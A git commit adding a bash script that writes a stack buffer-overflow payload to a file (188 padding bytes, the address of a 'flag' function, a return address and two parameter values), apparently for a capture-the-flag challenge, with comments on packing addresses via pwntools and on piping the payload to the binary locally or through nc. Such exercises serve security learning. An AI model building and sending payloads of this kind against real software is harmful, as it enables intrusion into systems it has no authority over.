188e274cef2eddecf2d0130de9a58f8c2b5eb14b
Michele De Donno <michelededonno@gmail.com>
2020-04-10 12:25:56 +0200

    Create pwn-bash.sh

---
+++ pwn-bash.sh
@@ -0,0 +1,45 @@
+#!/bin/bash
+#
+#
+# Bash script that generates the payload for the
+# Buffer Overflow of a function that requires 2 
+# parameters and that has an EIP offset of 188
+# 
+# Note 1: addresses are expressed in little endian 
+#       and have been generated using the pwntool
+#	python library (http://docs.pwntools.com/en/stable/)
+#	as shown below.
+#		$ python2.7
+#		>>> from pwn import *
+#		>>> p32(0xdeadbeef)
+#		'\xef\xbe\xad\xde'
+#		>>> p32(0xc0ded00d)
+#		'\r\xd0\xde\xc0
+#
+# Note 2: echo can also be used instead of printf:
+#		echo -n -e "<string>" >> <file>
+
+fname="payload.bin"
+rm -f $fname
+touch $fname
+# 188 characters 'A' for generating buffer overflow
+for i in {1..188}; do printf "%b" "\x41" >> $fname; done
+# Address of sym.flag function (0x080491e2)
+printf "%b" "\xe2\x91\x04\x08" >> $fname
+# Return address: we chose 0x080492fe
+printf "%b" "\xfe\x92\x04\x08" >> $fname
+#echo -n -e "\xfe\x92\x04\x08" >> $fname
+# par 1 addr (0xdeadbeef)
+printf "%b" "\xef\xbe\xad\xde" >> $fname
+# par 2 addr (0xc0ded00d)
+printf "%b" "\r\xd0\xde\xc0" >> $fname
+# endline
+printf "%b" "\n" >> $fname
+#echo -n -e "\n" >> $fname
+
+echo "Payload saved in $fname:"
+hexdump payload.bin
+
+# The payload can be used with the following commands:
+# $ cat payload.bin | ./binary-to-exploit
+# $ cat payload.bin | nc remotehost xxxx
